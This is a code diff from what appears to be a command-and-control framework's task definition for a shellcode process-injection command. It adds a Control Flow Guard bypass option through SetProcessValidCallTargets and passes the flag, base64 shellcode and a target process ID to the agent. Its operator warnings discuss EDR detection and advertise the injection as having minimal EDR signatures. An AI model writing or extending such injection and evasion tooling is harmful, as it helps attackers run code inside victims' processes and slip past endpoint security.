@@ -100,15 +100,39 @@ func init() {
 					},
 				},
 			},
+			{
+				Name:             "cfg_bypass",
+				ModalDisplayName: "CFG Bypass",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Mark shellcode allocation as a valid CFG call target (required on Windows 10/11 with Control Flow Guard enabled). Disable only if SetProcessValidCallTargets triggers EDR detection.",
+				DefaultValue:     true,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     3,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "New File",
+						UIModalPosition:     3,
+					},
+				},
+			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			pid, _ := taskData.Args.GetStringArg("pid")
 			variant, _ := taskData.Args.GetStringArg("variant")
+			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
+			cfgNote := ""
+			if cfgBypass {
+				cfgNote = " CFG bypass enabled (SetProcessValidCallTargets — detectable by some EDRs)."
+			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID:             taskData.Task.ID,
 				Success:            true,
 				OpsecPreBlocked:    false,
-				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Opus injection (variant: %s) into PID %s. Callback-based injection using unexplored Windows mechanisms — novel technique with minimal EDR signatures.", variant, pid),
+				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Opus injection (variant: %s) into PID %s. Callback-based injection using unexplored Windows mechanisms — novel technique with minimal EDR signatures.%s", variant, pid, cfgNote),
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -201,10 +225,12 @@ func init() {
 			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Opus variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(fileContents)))
 
 			// Build the actual parameters JSON that will be sent to the agent
+			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
 			params := map[string]interface{}{
 				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
 				"pid":           pid,
 				"variant":       variant,
+				"cfg_bypass":    cfgBypass,
 			}
 
 			paramsJSON, err := json.Marshal(params)
